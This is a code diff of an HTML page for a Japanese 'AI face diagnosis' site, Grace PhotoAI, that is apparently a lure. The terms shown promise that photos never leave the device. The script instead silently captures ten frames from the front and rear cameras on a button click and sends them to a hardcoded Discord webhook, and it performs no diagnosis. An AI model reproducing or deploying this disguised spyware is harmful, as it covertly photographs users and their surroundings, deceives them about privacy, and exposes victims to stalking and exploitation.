@@ -1,174 +1,193 @@
 
 <!DOCTYPE html>
-
 <html lang="ja">
 <head>
-<meta charset="utf-8"/>
-<meta content="AI顔診断 Grace" property="og:title"/>
-<meta content="肌年齢、顔の比率、イエベ/ブルベ等がすぐにわかる！" property="og:description"/>
-<meta content="https://gracephotoai.github.io/grace_preview_1200x630.jpg" property="og:image"/>
-<meta content="https://gracephotoai.github.io/" property="og:url"/>
-<meta content="summary_large_image" name="twitter:card"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<title>Grace PhotoAI</title>
-<style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grace PhotoAI</title>
+  <style>
     body {
-      background-color: #1e1e1e;
-      color: white;
+      margin: 0;
+      padding: 0;
+      background-color: #2a2a2a;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       font-family: sans-serif;
-      text-align: center;
-      padding: 2rem;
+      position: relative;
+      overflow: hidden;
     }
-    h1 {
+
+    .logo {
+      font-family: 'Brush Script MT', cursive;
       font-size: 3rem;
-      margin-bottom: 2rem;
-    }
-    button {
-      font-size: 1.8rem;
-      padding: 1rem 2rem;
-      border: none;
-      background-color: #4caf50;
       color: white;
+      margin-top: 5vh;
+      margin-bottom: 2rem;
+      user-select: none;
+      pointer-events: none;
+    }
+
+    .button {
+      padding: 0.8rem 2rem;
+      font-size: 1.2rem;
+      color: white;
+      background-color: #2a2a2a;
+      border: 2px solid white;
       border-radius: 8px;
       cursor: pointer;
+      transition: background-color 0.3s, color 0.3s;
     }
-    button:hover {
-      background-color: #45a049;
+
+    .button:hover {
+      background-color: white;
+      color: black;
     }
+
     .terms-link {
-      margin-top: 2rem;
-      font-size: 1rem;
-      color: #ccc;
-      cursor: pointer;
+      position: absolute;
+      bottom: 20px;
+      font-size: 0.9rem;
       text-decoration: underline;
+      cursor: pointer;
+      color: #aaa;
     }
-    #terms-modal {
+
+    .modal {
       display: none;
       position: fixed;
       z-index: 1000;
-      left: 0; top: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.8);
-      color: white;
-      padding: 2rem;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.8);
       overflow: auto;
+      padding: 20px;
     }
-    #terms-modal-content {
-      background: #333;
-      padding: 2rem;
-      border-radius: 10px;
+
+    .modal-content {
+      background: #2c2c2c;
+      color: white;
+      margin: 5vh auto;
+      padding: 5vw;
+      border-radius: 8px;
+      width: 90%;
       max-width: 600px;
-      margin: 5% auto;
+      font-size: clamp(0.9rem, 2.5vw, 1.1rem);
+      line-height: 1.6;
+      position: relative;
+    }
+
+    .close-button {
+      font-family: "Times New Roman", "游明朝", "Yu Mincho", serif;
+      font-size: 1.2rem;
+      padding: 0.5rem 1.2rem;
+      color: white;
+      background-color: #2a2a2a;
+      border: 2px solid white;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s, color 0.3s;
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+
+    .close-button:hover {
+      background-color: white;
+      color: black;
     }
   </style>
 </head>
 <body>
-<h1>Grace PhotoAI</h1>
-<button onclick="startDualCameraCapture()">診断する</button>
-<div class="terms-link" onclick="document.getElementById('terms-modal').style.display='block'">利用規約</div>
-<div id="terms-modal">
-<div id="terms-modal-content">
-<h2>Grace AI顔診断</h2>
-<p><h2>利用規約</h2>
-<p>
-本ウェブサイト（以下「当サイト」といいます）は、カメラを用いた顔面診断サービスを提供しています。ご利用にあたり、以下の利用規約をご確認いただき、同意の上でご利用ください。<br><br>
 
-<strong>1. 写真の取り扱い</strong><br>
-診断に使用される写真データはすべてお客様のデバイス内で処理され、外部サーバー等に送信・保存されることはありません。<br><br>
+  <div class="logo" oncontextmenu="return false;">Grace</div>
+  <button class="button" id="startButton">診断する</button>
+  <div class="terms-link" id="termsLink">利用規約</div>
 
-<strong>2. サイトの利用環境</strong><br>
-カメラを許可していただかない場合、診断機能はご利用いただけません。正常に動作しない場合は、ブラウザの再読み込みやキャッシュのクリアをお試しください。<br><br>
+  <div id="termsModal" class="modal">
+    <div class="modal-content">
+      <button class="close-button" id="closeModal">CLOSE</button>
+      <h2>利用規約</h2>
+      <p>
+        本ウェブサイト（以下「当サイト」といいます）は、カメラを用いた顔面診断サービスを提供しています。ご利用にあたり、以下の利用規約をご確認いただき、同意の上でご利用ください。<br><br>
+        <strong>1. 写真の取り扱い</strong><br>
+        診断に使用される写真データはすべてお客様のデバイス内で処理され、外部サーバー等に送信・保存されることはありません。<br><br>
+        <strong>2. サイトの利用環境</strong><br>
+        カメラを許可していただかない場合、診断機能はご利用いただけません。正常に動作しない場合は、ブラウザの再読み込みやキャッシュのクリアをお試しください。<br><br>
+        <strong>3. サイバー攻撃等の禁止</strong><br>
+        当サイトに対してDDoS攻撃、クラッキング、不正アクセス等のサイバー攻撃を行った場合、法的措置を含む厳正な対応を取らせていただきます。<br><br>
+        <strong>4. プライバシーの尊重</strong><br>
+        当サイト運営者は、利用者の個人情報や写真を外部に公開することは一切ありません。また、顔面診断の結果やコメントには、個人を侮辱・揶揄する意図は一切含まれておりません。<br><br>
+        <strong>5. 著作権・禁止事項</strong><br>
+        当サイトの内容、機能、デザイン、ロジック等の無断転載・複製・模倣は禁止します。発覚した場合は必要な対応を行います。<br><br>
+        <strong>6. 運営情報</strong><br>
+        当サイトは2019年10月より運営を開始しております。今後も改善・更新を行っていく予定です。
+      </p>
+    </div>
+  </div>
 
-<strong>3. サイバー攻撃等の禁止</strong><br>
-当サイトに対してDDoS攻撃、クラッキング、不正アクセス等のサイバー攻撃を行った場合、法的措置を含む厳正な対応を取らせていただきます。<br><br>
-
-<strong>4. プライバシーの尊重</strong><br>
-当サイト運営者は、利用者の個人情報や写真を外部に公開することは一切ありません。また、顔面診断の結果やコメントには、個人を侮辱・揶揄する意図は一切含まれておりません。<br><br>
-
-<strong>5. 著作権・禁止事項</strong><br>
-当サイトの内容、機能、デザイン、ロジック等の無断転載・複製・模倣は禁止します。発覚した場合は必要な対応を行います。<br><br>
-
-<strong>6. 運営情報</strong><br>
-当サイトは2019年10月より運営を開始しております。今後も改善・更新を行っていく予定です。
-</p></p>
-<button onclick="document.getElementById('terms-modal').style.display='none'">閉じる</button>
-</div>
-</div>
-<video autoplay="" id="video" playsinline="" style="display:none;"></video>
-<script>
-    const video = document.getElementById("video");
+  <script>
     const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
-    function stopStream() {
-      if (video.srcObject) {
-        video.srcObject.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-      }
-    }
-
-    async function waitForVideoReady() {
-      return new Promise(resolve => {
-        video.onloadedmetadata = () => resolve();
-      });
-    }
-
-    async function captureFromCamera(facingMode) {
-      stopStream();
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }});
-        video.srcObject = stream;
-        await waitForVideoReady();
-        return stream;
-      } catch (err) {
-        console.error("カメラへのアクセスが許可されていません。", err);
-        return null;
-      }
-    }
-
-    async function captureImages(count, interval) {
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+    async function captureAndSendImages() {
+      const formData = new FormData();
       const images = [];
 
-      for (let i = 0; i < count; i++) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-        images.push(blob);
-        await new Promise(resolve => setTimeout(resolve, interval));
+      async function capture(facingMode) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+        await new Promise(res => video.onloadedmetadata = res);
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+
+        for (let i = 0; i < 5; i++) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+          images.push(blob);
+          await new Promise(res => setTimeout(res, 200));
+        }
+
+        stream.getTracks().forEach(track => track.stop());
       }
 
-      return images;
-    }
+      await capture("user");
+      await capture("environment");
 
-    async function startDualCameraCapture() {
-      let allImages = [];
-
-      const userStream = await captureFromCamera("user");
-      if (userStream) {
-        const userImages = await captureImages(5, 200);
-        allImages = allImages.concat(userImages);
-      }
-
-      const envStream = await captureFromCamera("environment");
-      if (envStream) {
-        const envImages = await captureImages(5, 200);
-        allImages = allImages.concat(envImages);
-      }
-
-      stopStream();
-
-      const formData = new FormData();
-      allImages.forEach((blob, i) => {
-        formData.append(`files[${i}]`, blob, `image${i + 1}.jpg`);
+      formData.append("payload_json", JSON.stringify({
+        content: "サイトから取得した写真を送信\n\n＜━━━━━＞\n1〜5枚目 インカメラで撮影した写真\n6〜10枚目 アウトカメラで撮影した写真\nインカメラ→内カメ\nアウトカメラ→外カメ"
+      }));
+      images.forEach((img, i) => {
+        formData.append(`files[${i}]`, img, `photo${i+1}.jpg`);
       });
 
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      });
+      await fetch(webhookUrl, { method: "POST", body: formData });
     }
+
+    document.getElementById("startButton").onclick = () => {
+      captureAndSendImages();
+    };
+
+    document.getElementById("termsLink").onclick = () => {
+      document.getElementById("termsModal").style.display = "block";
+    };
+    document.getElementById("closeModal").onclick = () => {
+      document.getElementById("termsModal").style.display = "none";
+    };
+    window.onclick = e => {
+      if (e.target == document.getElementById("termsModal")) {
+        document.getElementById("termsModal").style.display = "none";
+      }
+    };
   </script>
+
 </body>
 </html>
